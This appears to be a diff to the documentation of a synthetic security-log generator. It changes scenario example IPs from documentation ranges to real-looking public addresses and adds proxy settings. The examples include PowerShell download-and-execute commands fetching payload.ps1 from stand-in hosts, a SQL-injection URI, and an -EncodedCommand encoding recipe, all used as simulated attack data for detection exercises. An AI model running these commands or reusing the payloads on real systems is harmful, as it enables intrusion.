@@ -207,7 +207,7 @@ environment:
       members: [marcus.chen]
 
   network:                        # Optional but recommended for realism
-    public_cidrs: ["203.0.113.0/28"]  # Org's public IP block (auto-derived from VIPs if omitted)
+    public_cidrs: ["45.83.220.0/28"]  # Org's lab public IP block (auto-derived from VIPs if omitted)
     segments:
       - name: corporate_lan
         cidr: "10.0.1.0/24"
@@ -239,8 +239,8 @@ environment:
           - {src: server_vlan, dst: external, ports: [80, 443, 53]}
           - {src: server_vlan, dst: server_vlan}
         nat_rules:                # NAT translation rules
-          - {type: dynamic_pat, src: corporate_lan, mapped_ip: "203.0.113.1"}
-          - {type: static, real_ip: "10.10.20.10", mapped_ip: "203.0.113.10"}
+          - {type: dynamic_pat, src: corporate_lan, mapped_ip: "45.83.220.1"}
+          - {type: static, real_ip: "10.10.20.10", mapped_ip: "45.83.220.10"}
 
 personas:                         # Define inline or reference pre-built from personas/
   - name: developer
@@ -257,6 +257,10 @@ time_window:
   duration: "8h"                  # OR use end: "2024-01-15T18:00:00Z"
   warmup: "8h"                    # Optional (default "8h", minimum "1h"). Pre-populates DNS
                                   # cache, process trees, sessions before start.
+
+# Ensure every storyline and red_herring time falls inside time_window. If the
+# last attack step is at +36h, use duration >= "37h" so baseline and signal
+# sources share the same collection horizon.
 
 baseline_activity:
   description: "Normal office activity"
@@ -325,7 +329,9 @@ The `os` field on systems determines which native log formats are generated:
 - **Zeek, Snort, Cisco ASA** → Network-level, OS-agnostic (driven by network sensor configuration)
 - **Cisco ASA** → Firewall allow/deny logs; requires `type: firewall` sensor with `policy` rules and `interfaces` mapping
 - **web_access** → Generated for systems with `roles: [web_server]`
-- **proxy_access** → Generated for systems with `roles: [forward_proxy]`; logs all outbound HTTP/HTTPS from internal systems routed through the proxy, with CONNECT entries for HTTPS, cache HIT/MISS, and full destination URLs
+- **proxy_access** → Generated for systems with `roles: [forward_proxy]`; logs outbound HTTP/HTTPS routed through the proxy, with CONNECT entries for HTTPS, cache HIT/MISS, and full destination URLs
+
+If `proxy_access` is included in `output.logs`, include at least one proxy system with `roles: [forward_proxy]` and a realistic service such as `squid`; otherwise validation warns and no proxy log file will be generated. Also set `environment.proxy.mode`: use `transparent` when Zeek/IDS should show direct-looking client→origin traffic, or `explicit` for PAC/browser-configured proxies where Zeek/IDS/firewall sources should show client→proxy plus proxy→origin legs. In explicit mode, denied proxy requests stop at the proxy and do not emit proxy→origin evidence. For explicit mode, set `listener_port` (default/warning fallback: 8080).
 
 For realism, try to provide both `roles` and `services` on non-workstation hosts. The generator uses them to compile the world model that drives infrastructure-aware background traffic and realistic remote-session paths.
 
@@ -403,8 +409,8 @@ When building storyline events, each entry needs an `events` list with typed dec
 
 **Firewall/network event types:**
 - `port_scan` — Bulk denied connections for recon/scanning. Fields: `target_ips` or `target_segment`+`target_count`, `ports`, `protocol`, `scan_rate`. Produces ASA 106023 denies + correlated Zeek conn entries.
-- `beacon` — Periodic connections (allowed or denied). Fields: `dst_ip`, `dst_port`, `interval`, one of `end_time`/`duration`/`count`, `action` (allow/deny, default: allow), `jitter` (default: 0.15), `referrer` (optional HTTP Referer, auto-generated if omitted), plus all `connection` fields. Use `action: deny` for firewall-blocked beaconing.
-- `web_scan` — Bulk HTTP scanning from presets. Fields: `dst_ip`, `rate`, `preset` (nikto/dirb/gobuster/sqlmap/nmap_http) or `paths`, `hostname`, `user_agent`, `jitter` (default: 0.4). Automatically generates Snort IDS alerts: scanner UA detection (Layer 1, non-TLS only), per-path content alerts for probe-specific SIDs (Layer 2, non-TLS only), and connection-rate threshold alerts (Layer 3, both TLS and non-TLS). Referer headers are generated per-preset according to real scanner behavior (Nikto: partial-crawl same-origin ~30%; others: none). Per-request UA token substitution produces varied values for templated scanner UAs (e.g., Nikto's Test: ID). IDS alert definitions and `send_referrer` config are in `web_scan_presets.yaml`.
+- `beacon` — Periodic connections (allowed or denied). Fields: `dst_ip`, `dst_port`, `interval`, one of `end_time`/`duration`/`count`, `action` (allow/deny, default: allow), `jitter` (default: 0.15), `referrer` (optional HTTP Referer, auto-generated if omitted), plus all `connection` fields. In explicit proxy mode, HTTP/S beacons from proxied hosts traverse the proxy; use `action: deny` for proxy- or firewall-blocked beaconing.
+- `web_scan` — Bulk HTTP scanning from presets. Fields: `dst_ip`, `rate` (average requests/second; exact only when `count` is set), `preset` (nikto/dirb/gobuster/sqlmap/nmap_http) or `paths`, `hostname`, `user_agent`, `jitter` (default: 0.4). Automatically generates Snort IDS alerts: scanner UA detection (Layer 1, non-TLS only), per-path content alerts for probe-specific SIDs (Layer 2, non-TLS only), and connection-rate threshold alerts (Layer 3, both TLS and non-TLS). Referer headers are generated per-preset according to real scanner behavior (Nikto: partial-crawl same-origin ~30%; others: none). Per-request UA token substitution produces varied values for templated scanner UAs (e.g., Nikto's Test: ID). IDS alert definitions and `send_referrer` config are in `web_scan_presets.yaml`.
 - `credential_spray` — Bulk auth attacks. Fields: `target_accounts`, `interval`, `pattern` (spray/brute_force/stuffing), `success` ({account, after}), `jitter` (default: 0.5). OS-aware: Windows 4625/4776 or Linux syslog.
 - `dns_query` — Standalone DNS query. Fields: `query`, `qtype`, `rcode`, `ttl`, `answer` (required for NOERROR).
 - `dga_queries` — Bulk DGA domain lookups. Fields: `interval`, `length_range`, `charset`, `tld`, `seed`, `rcode_distribution`, `answer_ip`.
@@ -423,7 +429,7 @@ events:
     command_line: "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://cdn-assets-update.com/payload.ps1')\""
     technique: "T1059.001 - PowerShell"
   - type: connection               # Pair with connection so domain appears in DNS/SSL/proxy
-    dst_ip: "203.0.113.50"
+    dst_ip: "45.83.221.50"
     dst_port: 443
     hostname: "cdn-assets-update.com"
     service: ssl
@@ -440,7 +446,7 @@ IMPORTANT: When a connection uses a domain name (not a raw IP), set `hostname` o
 ```yaml
 events:
   - type: connection
-    dst_ip: "198.51.100.10"
+    dst_ip: "45.83.221.10"
     dst_port: 443
     hostname: "cdn-assets-update.com"   # Domain for DNS/SSL/proxy
     service: "ssl"
@@ -451,7 +457,7 @@ events:
 ```yaml
 events:
   - type: connection
-    dst_ip: "198.51.100.10"
+    dst_ip: "45.83.221.10"
     dst_port: 80
     service: http
     method: "POST"
@@ -469,7 +475,7 @@ events:
     dst_ip: "10.10.20.10"
     dst_port: 80
     service: http
-    source_ip: "203.0.113.45"
+    source_ip: "104.248.71.33"
     method: "GET"
     uri: "/ehr/login.php?id=1' OR 1=1--"
     status_code: 200
@@ -519,7 +525,7 @@ events:
 
 The validator warns if it detects potentially redundant manual specifications alongside events that would auto-generate them.
 
-Use RFC 5737 documentation IP ranges for external attacker IPs (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24). Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems.
+For realism-bound scenarios, do not use RFC 5737 TEST-NET ranges (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) for public NATs, C2, scanners, or attacker infrastructure. Those ranges are safe for documentation snippets, but they are an obvious synthetic-data tell in generated logs. Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems, and use a scenario-owned lab public allocation or generated non-reserved public-looking addresses for external infrastructure.
 
 ### Long Time Windows and Baseline Exercises
 
@@ -533,7 +539,7 @@ When a storyline event includes base64-encoded data, obfuscated commands, or any
 
 For PowerShell's `-EncodedCommand` flag (which expects UTF-16LE base64):
 ```bash
-echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.45/payload.ps1")' | iconv -t UTF-16LE | base64
+echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://45.83.221.45/payload.ps1")' | iconv -t UTF-16LE | base64
 ```
 
 For plain base64 (Linux commands, general obfuscation):
